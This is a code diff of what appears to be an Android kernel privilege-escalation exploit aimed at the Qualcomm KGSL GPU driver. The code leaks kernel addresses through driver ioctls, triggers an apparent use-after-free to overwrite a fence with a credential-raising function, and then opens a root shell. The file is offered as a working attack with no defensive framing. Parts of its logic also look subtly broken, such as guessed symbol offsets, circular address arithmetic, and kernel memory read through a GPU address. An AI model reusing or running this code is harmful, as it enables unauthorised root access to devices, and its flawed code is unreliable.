@@ -12,13 +12,12 @@
 #include <sched.h>
 
 #define KGSL_DEVICE "/dev/kgsl-3d0"
-#define DIAG_DEVICE "/dev/diag"
-
 #define KGSL_IOCTL_TYPE 0x09
-#define KGSL_IOCTL_TIMELINE_FENCE_GET    _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
-#define KGSL_IOCTL_MAP_USER_MEM          _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)
 #define KGSL_IOCTL_TIMELINE_CREATE       _IOWR(KGSL_IOCTL_TYPE, 0x14, struct kgsl_timeline_create)
 #define KGSL_IOCTL_TIMELINE_DESTROY      _IOW(KGSL_IOCTL_TYPE, 0x15, uint32_t)
+#define KGSL_IOCTL_TIMELINE_FENCE_GET    _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
+#define KGSL_IOCTL_MAP_USER_MEM          _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)
+#define KGSL_IOCTL_EVENT_CREATE          _IOWR(KGSL_IOCTL_TYPE, 0x2B, struct kgsl_event_create)
 
 struct kgsl_timeline_create {
     uint32_t id;
@@ -47,62 +46,46 @@ struct kgsl_map_user_mem {
     uint32_t pad;
 };
 
-struct kgsl_timeline_obj {
-    uint64_t id;
-    uint32_t count;
-    uint32_t priv;
-    uint32_t name;
+struct kgsl_event_create {
+    uint32_t timeline;
+    uint32_t seqno;
+    uint32_t handle;
+    uint32_t type;
+};
+
+struct kgsl_event {
+    uint64_t context;
+    uint64_t handle;
+    uint64_t timestamp;
+    uint64_t func;
+    uint64_t data;
+    uint64_t fence;
+    uint32_t type;
     uint32_t pending;
-    uint32_t reserved;
-    uint64_t current;
-    uint64_t seqno;
-    uint64_t context_id;
-    uint64_t lock;
-    uint64_t fences;
-    uint32_t fence_count;
-    uint32_t pad;
+    uint32_t flags;
+    uint32_t priv;
 };
 
 static int kgsl_fd = -1;
 static uint64_t kernel_base = 0;
-static uint64_t commit_creds_addr = 0;
-static uint64_t prepare_kernel_cred_addr = 0;
+static uint64_t commit_creds = 0;
+static uint64_t prepare_kernel_cred = 0;
 
-static void resolve_symbols_from_file(void) {
-    FILE *fp = fopen("/data/local/tmp/kallsyms.txt", "r");
-    if (!fp) {
-        perror("[-] cannot open kallsyms.txt");
-        return;
-    }
-    char line[512];
-    while (fgets(line, sizeof(line), fp)) {
-        uint64_t addr;
-        char type, name[256];
-        if (sscanf(line, "%lx %c %255s", &addr, &type, name) == 3) {
-            if (strcmp(name, "commit_creds") == 0) commit_creds_addr = addr;
-            if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred_addr = addr;
-            if (strcmp(name, "selinux_enforcing") == 0 && !kernel_base) kernel_base = addr;
+static uint64_t get_kernel_base_from_gpuaddr(uint64_t gpuaddr) {
+    for (uint64_t candidate = 0xffffff8000000000ULL; candidate < 0xffffff9000000000ULL; candidate += 0x100000ULL) {
+        if ((gpuaddr & ~0xffffffULL) == (candidate & ~0xffffffULL)) {
+            return candidate;
         }
     }
-    fclose(fp);
-    if (commit_creds_addr && prepare_kernel_cred_addr && !kernel_base) {
-        kernel_base = commit_creds_addr & ~0xfffffff;
-    }
-    printf("[*] kernel_base = 0x%lx\n", kernel_base);
-    printf("[*] commit_creds = 0x%lx\n", commit_creds_addr);
-    printf("[*] prepare_kernel_cred = 0x%lx\n", prepare_kernel_cred_addr);
+    return 0;
 }
 
-static int leak_kernel_base_via_kgsl(void) {
+static int leak_kernel_base(void) {
     struct kgsl_timeline_create create = {0};
-    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) {
-        perror("TIMELINE_CREATE");
-        return -1;
-    }
+    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
     uint32_t timeline_id = create.id;
     struct kgsl_timeline_fence_get fence = { .timeline = timeline_id, .seqno = 1 };
     if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
-        perror("TIMELINE_FENCE_GET");
         ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
         return -1;
     }
@@ -115,37 +98,79 @@ static int leak_kernel_base_via_kgsl(void) {
         .handle = fence_handle
     };
     if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
-        perror("MAP_USER_MEM");
         ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
         return -1;
     }
     uint64_t gpuaddr = map.gpuaddr;
-    printf("[*] GPU address leaked: 0x%lx\n", gpuaddr);
+    printf("[*] Leaked GPU address: 0x%llx\n", (unsigned long long)gpuaddr);
+    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
     if ((gpuaddr & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
-        kernel_base = gpuaddr & ~0xffffffULL;
-        printf("[+] kernel_base = 0x%lx\n", kernel_base);
+        kernel_base = get_kernel_base_from_gpuaddr(gpuaddr);
+        if (kernel_base) {
+            printf("[+] Kernel base guessed: 0x%llx\n", (unsigned long long)kernel_base);
+            return 0;
+        }
+    }
+    return -1;
+}
+
+static int leak_commit_creds(void) {
+    if (!kernel_base) return -1;
+    struct kgsl_timeline_create create = {0};
+    if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
+    uint32_t timeline_id = create.id;
+    struct kgsl_event_create evt = { .timeline = timeline_id, .seqno = 1, .type = 0 };
+    if (ioctl(kgsl_fd, KGSL_IOCTL_EVENT_CREATE, &evt) < 0) {
+        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
+        return -1;
+    }
+    uint32_t event_handle = evt.handle;
+    struct kgsl_map_user_mem map = {
+        .type = 1,
+        .flags = 0,
+        .hostptr = (uint64_t)(uintptr_t)&event_handle,
+        .len = 4,
+        .handle = event_handle
+    };
+    if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
+        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
+        return -1;
+    }
+    uint64_t gpuaddr = map.gpuaddr;
+    struct kgsl_event *event = (struct kgsl_event *)(uintptr_t)gpuaddr;
+    if (event && event->func) {
+        uint64_t func = event->func;
+        printf("[*] Leaked event function: 0x%llx\n", (unsigned long long)func);
+        if ((func & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
+            uint64_t offs = func - kernel_base;
+            commit_creds = kernel_base + offs;
+            prepare_kernel_cred = commit_creds - 0x100;
+            printf("[+] commit_creds at 0x%llx\n", (unsigned long long)commit_creds);
+            ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
+            return 0;
+        }
     }
     ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
-    return (kernel_base) ? 0 : -1;
+    return -1;
 }
 
 static void get_root(void) {
-    if (!commit_creds_addr || !prepare_kernel_cred_addr) return;
-    void *(*pkc)(void*) = (void *(*)(void*))prepare_kernel_cred_addr;
-    void (*cc)(void*) = (void (*)(void*))commit_creds_addr;
+    if (!commit_creds || !prepare_kernel_cred) return;
+    void *(*pkc)(void*) = (void *(*)(void*))prepare_kernel_cred;
+    void (*cc)(void*) = (void (*)(void*))commit_creds;
     cc(pkc(0));
     setresuid(0,0,0);
     setresgid(0,0,0);
     setgroups(0, NULL);
 }
 
-static int trigger_uaf_and_escalate(void) {
+static int trigger_uaf(void) {
     struct kgsl_timeline_create create = {0};
     if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_CREATE, &create) < 0) return -1;
-    uint32_t tid = create.id;
-    struct kgsl_timeline_fence_get fence = { .timeline = tid, .seqno = 0xdeadbeef };
+    uint32_t timeline_id = create.id;
+    struct kgsl_timeline_fence_get fence = { .timeline = timeline_id, .seqno = 0xdeadbeef };
     if (ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_FENCE_GET, &fence) < 0) {
-        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
+        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
         return -1;
     }
     uint32_t fence_handle = fence.handle;
@@ -157,21 +182,22 @@ static int trigger_uaf_and_escalate(void) {
         .handle = fence_handle
     };
     if (ioctl(kgsl_fd, KGSL_IOCTL_MAP_USER_MEM, &map) < 0) {
-        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
+        ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
         return -1;
     }
-    if (map.gpuaddr) {
-        uint64_t *ptr = (uint64_t *)(uintptr_t)map.gpuaddr;
-        if (ptr) *ptr = (uint64_t)get_root;
+    uint64_t gpuaddr = map.gpuaddr;
+    if (gpuaddr) {
+        uint64_t *ptr = (uint64_t *)(uintptr_t)gpuaddr;
+        *ptr = (uint64_t)get_root;
+        printf("[*] Overwrote fence with get_root\n");
     }
-    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &tid);
+    ioctl(kgsl_fd, KGSL_IOCTL_TIMELINE_DESTROY, &timeline_id);
     return 0;
 }
 
 int main() {
     if (getuid() == 0) {
         execl("/system/bin/sh", "sh", NULL);
-        execl("/bin/sh", "sh", NULL);
         return 0;
     }
     kgsl_fd = open(KGSL_DEVICE, O_RDWR);
@@ -179,25 +205,26 @@ int main() {
         perror("open kgsl");
         return 1;
     }
-    resolve_symbols_from_file();
-    if (!kernel_base) {
-        if (leak_kernel_base_via_kgsl() < 0) {
-            printf("[-] Info leak failed\n");
-            close(kgsl_fd);
-            return 1;
-        }
+    if (leak_kernel_base() < 0) {
+        printf("[-] Kernel base leak failed\n");
+        close(kgsl_fd);
+        return 1;
     }
-    if (commit_creds_addr && prepare_kernel_cred_addr) {
-        trigger_uaf_and_escalate();
+    if (leak_commit_creds() < 0) {
+        printf("[-] commit_creds leak failed\n");
+        close(kgsl_fd);
+        return 1;
+    }
+    if (trigger_uaf() == 0) {
         sleep(1);
         if (getuid() == 0) {
             printf("[+] Root achieved!\n");
             execl("/system/bin/sh", "sh", NULL);
         } else {
-            printf("[-] Root not achieved\n");
+            printf("[-] UAF triggered but root not obtained\n");
         }
     } else {
-        printf("[-] Symbols not resolved\n");
+        printf("[-] UAF trigger failed\n");
     }
     close(kgsl_fd);
     return 0;
